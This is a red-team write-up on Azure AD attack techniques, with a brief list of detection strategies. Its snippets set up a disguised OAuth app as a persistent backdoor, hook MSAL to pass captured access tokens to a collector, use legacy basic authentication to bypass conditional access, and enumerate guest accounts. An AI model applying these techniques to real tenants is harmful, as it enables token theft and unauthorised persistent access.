# Azure AD Attack Techniques for Red Team Operations

**Date:** December 2024  
**Environment:** Azure AD tenant with hybrid identity  
**Techniques:** Token manipulation, OAuth abuse, persistent backdoors

## Overview

Azure AD (now Microsoft Entra ID) introduces a different attack surface compared to on-premises Active Directory. This write-up explores several Azure AD-specific attack techniques that red teams can leverage during engagements.

## Technique 1: OAuth App Registration for Persistence

Registering a custom OAuth app provides a persistent backdoor that survives password changes:

```bash
# Register app via Azure CLI
az ad app create --display-name "TelemetryCollector" \
    --identifier-uris "api://telemetry-collector" \
    --required-access-app-id 00000003-0000-0000-c000-000000000000 \
    --api-permissions "User.Read.All=Scope Directory.Read.All=Role"
```

Once registered, generate a client secret and use it to obtain tokens for directory access.

## Technique 2: Token Theft via Browser Extensions

A custom browser extension can capture Azure AD access tokens from single-sign-on sessions:

```javascript
// Capture token from MSAL.js
const originalAcquireToken = msalInstance.acquireTokenSilent.bind(msalInstance);
msalInstance.acquireTokenSilent = async (request) => {
    const token = await originalAcquireToken(request);
    sendToCollector(token);
    return token;
};
```

## Technique 3: Conditional Access Bypass

Exploit gaps in conditional access policies:

1. **Legacy authentication:** If not explicitly disabled, use POP3/IMAP/SMTP
2. **Trusted locations:** Add attacker-controlled IP ranges
3. **Device compliance:** Register a compliant device from attacker infrastructure

```bash
# Use legacy authentication with PowerShell
$creds = Get-Credential
New-PSSession -ConfigurationName Microsoft.Exchange \
    -ConnectionUri https://outlook.office365.com/powershell-liveid/ \
    -Credential $creds -Authentication Basic -AllowRedirection
```

## Technique 4: Cross-Tenant Federation Abuse

In environments with B2B collaboration, abuse guest account permissions:

```bash
# Enumerate guest accounts
az ad user list --filter "userType eq 'Guest'" --query "[].{displayName:displayName,userPrincipalName:userPrincipalName}"

# Check guest permissions
az ad app permission list --id <app-id> --query "[]"
```

## Detection Strategies

1. **Monitor app registrations:** Alert on new OAuth app creations
2. **Token analytics:** Track unusual token issuance patterns
3. **Conditional access logging:** Review sign-in logs for policy bypasses
4. **Guest account audits:** Regularly review guest permissions

## Tools Used

- [Azure AD Attack Tool](https://github.com/Cloud-Security-Alliance/azure-ad-attack-tool)
- [MSAL.js](https://github.com/AzureAD/microsoft-authentication-library-for-js)
- [Azure CLI](https://docs.microsoft.com/cli/azure)